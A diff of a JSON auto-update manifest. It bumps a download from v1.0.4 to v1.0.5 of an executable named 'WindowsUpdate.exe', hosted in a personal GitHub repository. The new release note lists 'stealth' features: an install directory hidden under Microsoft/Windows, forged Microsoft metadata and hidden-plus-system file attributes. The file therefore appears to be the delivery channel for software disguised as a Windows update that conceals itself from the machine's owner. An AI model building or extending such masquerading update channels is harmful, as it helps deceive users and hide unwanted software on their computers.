@@ -1,6 +1,6 @@
 ﻿{
-    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.4/WindowsUpdate.exe",
-    "sha256":  "2cee2be708e8ad2224672845976fbacafa419625f787944da8769c1fde4eefaf",
-    "version":  "1.0.4",
-    "notes":  "Renamed to WindowsUpdate.exe — migrates legacy homeCtrl install automatically"
+    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.5/WindowsUpdate.exe",
+    "sha256":  "41220cd645d59605293c868c789de7657fd85861dc2f3c967d5c7d28b2000ba0",
+    "version":  "1.0.5",
+    "notes":  "Stealth: hidden install dir (Microsoft/Windows/), MS metadata, hidden+system attrs"
 }
